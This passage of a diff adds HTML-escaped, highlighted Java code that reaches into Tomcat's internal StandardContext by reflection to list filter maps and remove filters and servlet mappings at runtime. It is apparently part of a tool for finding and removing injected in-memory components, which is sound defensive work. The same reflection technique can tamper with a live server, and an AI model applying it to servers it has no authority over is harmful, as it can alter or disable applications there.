+                &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_filterConfigs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;filterConfigs&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;_filterConfigs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;filterConfigs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;)&lt;/span&gt; &lt;span class="n"&gt;_filterConfigs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;filterConfigs&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="c1"&gt;// FilterMap[]
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="nf"&gt;getFilterMaps&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_filterMaps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;filterMaps&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;_filterMaps&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;filterMaps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_filterMaps&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;filterArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// tomcat 789
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_array&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filterMaps&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;array&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;_array&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;filterArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt; &lt;span class="n"&gt;_array&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filterMaps&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// tomcat 6
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="n"&gt;filterArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt; &lt;span class="n"&gt;filterMaps&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;filterArray&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="cm"&gt;/**
+&lt;/span&gt;&lt;span class="cm"&gt;             * 遗留问题,getFilterConfig()依然存在2个
+&lt;/span&gt;&lt;span class="cm"&gt;             * @param request
+&lt;/span&gt;&lt;span class="cm"&gt;             * @param filterName
+&lt;/span&gt;&lt;span class="cm"&gt;             * @throws Exception
+&lt;/span&gt;&lt;span class="cm"&gt;             */&lt;/span&gt;
+            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;synchronized&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;deleteFilter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;filterName&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="c1"&gt;// org.apache.catalina.core.StandardContext#removeFilterDef
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;filterConfig&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getFilterConfig&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;appFilterConfig&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filterConfig&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filterName&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_filterDef&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;appFilterConfig&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;filterDef&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;_filterDef&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;filterDef&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_filterDef&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;appFilterConfig&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Class&lt;/span&gt; &lt;span class="n"&gt;clsFilterDef&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="c1"&gt;// Tomcat 8
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="n"&gt;clsFilterDef&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;org.apache.tomcat.util.descriptor.web.FilterDef&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="c1"&gt;// Tomcat 7
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="n"&gt;clsFilterDef&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;org.apache.catalina.deploy.FilterDef&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;Method&lt;/span&gt; &lt;span class="n"&gt;removeFilterDef&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredMethod&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;removeFilterDef&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;[]{&lt;/span&gt;&lt;span class="n"&gt;clsFilterDef&lt;/span&gt;&lt;span class="o"&gt;});&lt;/span&gt;
+                &lt;span class="n"&gt;removeFilterDef&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;removeFilterDef&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filterDef&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                &lt;span class="c1"&gt;// org.apache.catalina.core.StandardContext#removeFilterMap
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                &lt;span class="n"&gt;Class&lt;/span&gt; &lt;span class="n"&gt;clsFilterMap&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="c1"&gt;// Tomcat 8
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="n"&gt;clsFilterMap&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;org.apache.tomcat.util.descriptor.web.FilterMap&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="c1"&gt;// Tomcat 7
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="n"&gt;clsFilterMap&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;org.apache.catalina.deploy.FilterMap&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;filterMaps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getFilterMaps&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;filterMap&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;filterMaps&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_filterName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filterMap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;filterName&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;_filterName&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;filterName0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;_filterName&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filterMap&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filterName0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filterName&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                        &lt;span class="n"&gt;Method&lt;/span&gt; &lt;span class="n"&gt;removeFilterMap&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredMethod&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;removeFilterMap&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;[]{&lt;/span&gt;&lt;span class="n"&gt;clsFilterMap&lt;/span&gt;&lt;span class="o"&gt;});&lt;/span&gt;
+                        &lt;span class="n"&gt;removeFilterDef&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                        &lt;span class="n"&gt;removeFilterMap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filterMap&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;synchronized&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;deleteServlet&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;servletName&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;childs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getChildren&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;objChild&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;childs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servletName&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;urlPattern&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;servletMaps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getServletMaps&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Entry&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;servletMap&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;servletMaps&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;entrySet&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servletMap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getValue&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servletName&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                        &lt;span class="n"&gt;urlPattern&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;servletMap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getKey&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urlPattern&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="c1"&gt;// 反射调用 org.apache.catalina.core.StandardContext#removeServletMapping
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;Method&lt;/span&gt; &lt;span class="n"&gt;removeServletMapping&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredMethod&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;removeServletMapping&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;[]{&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;});&lt;/span&gt;
+                    &lt;span class="n"&gt;removeServletMapping&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;removeServletMapping&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;urlPattern&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="c1"&gt;// Tomcat 6必须removeChild 789可以不用
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="c1"&gt;// 反射调用 org.apache.catalina.core.StandardContext#removeChild
